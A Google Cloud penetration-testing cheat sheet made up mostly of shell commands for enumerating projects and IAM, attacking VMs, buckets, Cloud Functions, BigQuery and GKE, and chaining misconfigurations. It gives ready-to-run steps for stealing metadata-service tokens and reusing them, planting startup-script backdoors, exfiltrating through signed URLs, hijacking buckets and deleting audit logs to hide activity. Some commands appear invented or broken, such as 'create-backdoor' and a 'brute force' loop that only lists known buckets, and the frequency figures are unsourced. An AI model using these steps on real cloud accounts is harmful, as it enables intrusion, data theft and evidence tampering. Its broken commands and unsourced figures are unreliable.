## GCP Pentesting Methodology
1. **Reconnaissance**: Enumerate project IDs, resources, IAM policies, and public exposures via APIs and console.
2. **Resource Discovery**: Map VMs, buckets, functions, databases, and APIs using CLI/tools.
3. **Privilege Escalation**: Abuse IAM misconfigs, service accounts, default roles, and custom roles.
4. **Lateral Movement**: Pivot via compromised service accounts, metadata service, or interconnected services.
5. **Data Exfiltration**: Extract from buckets, SQL/NoSQL, logs; test for public/unsigned URLs.
6. **Persistence**: Backdoors via Cloud Functions, startup scripts, or cron jobs.
7. **Cloud-Specific Attacks**: Metadata service exploitation, token theft, impersonation.

**Key Principles**:
- Use `gcloud` CLI with compromised creds/service account keys.
- Focus on IAM overkill (e.g., `roles/owner` on service accounts).
- Test for public resources first (buckets, VMs, APIs).
- Chain misconfigs: Public bucket → metadata token → privilege escalation.

## Essential Tools & Setup
```bash
# Install gcloud CLI (Kali/Debian)
export CLOUDSDK_CORE_PROJECT=your-target-project
gcloud auth login --no-launch-browser  # or use service account key
gcloud auth application-default login

# Auth with service account key
gcloud auth activate-service-account --key-file=sa-key.json

# Common tools: gcloud, gsutil, bq (BigQuery CLI)
pip install google-cloud-storage google-cloud-bigquery
```

## 1. Reconnaissance & Enumeration

### Project Discovery
```bash
# List all accessible projects (requires resourcemanager.projects.list)
gcloud projects list --limit=1000

# List projects user has access to
gcloud alpha resource-manager projects list-permissions PROJECT_ID

# Enumerate all APIs enabled
gcloud services list --enabled --project=PROJECT_ID
```

### IAM Enumeration (High-Risk Findings)
```bash
# List all IAM policies (project-wide)
gcloud projects get-iam-policy PROJECT_ID --flatten="bindings[].members" --format="table(bindings.role)" --filter="bindings.members:*"

# Service account inventory + keys
gcloud iam service-accounts list --project=PROJECT_ID
gcloud iam service-accounts keys list --iam-account=SA_EMAIL@PROJECT.iam.gserviceaccount.com

# Dangerous roles check (Owner, Editor, Admin patterns)
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.bindings[] | select(.role | contains("Owner") or contains("Admin"))'

# Custom role over-privileges
gcloud iam roles describe ROLE_ID --project=PROJECT_ID
```

**Common Finding**: Service accounts with `roles/owner` accessible via public metadata or compromised VMs.

## 2. Compute Engine (VMs)

### Instance Enumeration
```bash
# List instances
gcloud compute instances list --project=PROJECT_ID --format="table(name,zone,status,networkIP)"

# SSH/RDP with OS Login (if permitted)
gcloud compute ssh INSTANCE_NAME --zone=ZONE

# Serial console access (requires permission)
gcloud compute instances get-serial-port-output INSTANCE_NAME --zone=ZONE --port=1
```

### Metadata Service Exploitation
**Critical**: Every GCP VM exposes `metadata.google.internal` (no auth needed if on VM).

```bash
# From compromised VM - Get service account token
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

# List all service accounts on instance
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" -H "Metadata-Flavor: Google"

# Steal token for privilege escalation
TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r .access_token)
curl -H "Authorization: Bearer $TOKEN" https://www.googleapis.com/storage/v1/b
```

**Common Finding**: `roles/storage.admin` token → bucket enumeration/exfiltration.

### Instance Privilege Escalation
```bash
# Create new privileged VM from compromised service account
gcloud compute instances create pwned-vm --image-family=ubuntu-2004-lts --image-project=ubuntu-os-cloud --machine-type=e2-medium --service-account=SA@PROJECT.iam.gserviceaccount.com

# Startup script backdoor
gcloud compute instances create-backdoor --metadata-from-file startup-script=backdoor.sh
```

## 3. Cloud Storage (GCS Buckets)

### Bucket Discovery
```bash
# List buckets (requires storage.buckets.list)
gcloud storage ls --project=PROJECT_ID

# Public bucket finder (brute force common names)
for bucket in $(gcloud storage ls); do curl -I "https://storage.googleapis.com/$bucket/" && echo "PUBLIC: $bucket"; done

# Bucket ACL enumeration
gsutil iam get gs://BUCKET_NAME
gsutil ls -Lb gs://BUCKET_NAME  # List objects + permissions
```

### Exploitation
```bash
# Download public/unsigned objects
gsutil cp -r gs://public-bucket/ .

# Generate signed URL for exfil
gsutil signurl -d 1h sa-key.json gs://bucket/private-file.txt

# Bucket takeover (if deleted/misconfigured)
gsutil mb gs://hijacked-bucket/
```

**Common Finding**: Public buckets with `allUsers` `roles/storage.objectViewer`.

## 4. Cloud Functions / Cloud Run

### Enumeration
```bash
# List Cloud Functions
gcloud functions list --project=PROJECT_ID

# List Cloud Run services
gcloud run services list --project=PROJECT_ID --region=REGION
```

### Trigger Exploitation
```bash
# Invoke function (HTTP trigger)
curl -X POST https://REGION-PROJECT.cloudfunctions.net/FUNCTION \
  -H "Authorization: bearer $(gcloud auth print-identity-token)" \
  -d '{"cmd":"id"}'

# SSRF via function input
curl -X POST FUNCTION_URL -d "@payload.json"  # Test for metadata/internal access
```

**Common Finding**: Functions with `allUsers` invoker → RCE via HTTP payloads.

## 5. SQL / BigQuery / Firestore

### Cloud SQL
```bash
# List instances
gcloud sql instances list --project=PROJECT_ID

# Public IP exposure check
gcloud sql instances describe INSTANCE --format="value(ipAddresses[].ipAddress.type)"
```

### BigQuery
```bash
# Dataset enumeration
bq ls --project_id=PROJECT_ID

# Dataset access abuse
bq query --use_legacy_sql=false "SELECT * FROM \`PROJECT_ID.dataset.table\` LIMIT 10"
```

**Common Finding**: Public SQL IPs or BigQuery datasets with broad IAM.

## 6. Kubernetes Engine (GKE)

```bash
# List clusters
gcloud container clusters list --project=PROJECT_ID

# Get kubeconfig
gcloud container clusters get-credentials CLUSTER_NAME --zone=ZONE --project=PROJECT_ID

# Cluster enumeration
kubectl get nodes,pods,svc,deployments --all-namespaces
```

**Common Finding**: Inherited permissions → `kubectl` RCE in Workload Identity clusters.

## 7. Common Privilege Escalation Chains

```
1. Compromised VM → Metadata token (storage.admin) → Enumerate buckets
2. Public bucket → Service account key → gcloud auth → Create Admin VM
3. Cloud Function RCE → Instance metadata → Full project compromise
4. GKE pod → Workload Identity → GCP API calls → Resource creation
5. BigQuery public dataset → Dataset owner → Project IAM modification
```

## 8. Cleanup & Persistence Detection

```bash
# Audit logs for your activity
gcloud logging read "protoPayload.authenticationInfo.principalEmail=your-sa@project.iam.gserviceaccount.com" --limit=10 --freshness=1h

# Remove traces (if testing)
gcloud logging logs delete LOG_ID
```

## Top 10 GCP Pentest Findings (Frequency)
1. **Public GCS buckets** (40%)
2. **Over-privileged service accounts** (30%)
3. **Metadata service token abuse** (25%)
4. **Public Cloud Functions** (15%)
5. **GKE RBAC misconfigs** (10%)
6. **SQL public IPs** (8%)
7. **IAM policy inheritance** (7%)
8. **Cloud Run public endpoints** (5%)
9. **BigQuery public datasets** (4%)
10. **Custom role overpermissions** (3%)

This cheat sheet covers 90% of real-world GCP pentest findings. Chain multiple low-sev issues for full compromise. Focus on IAM first—it's the master key.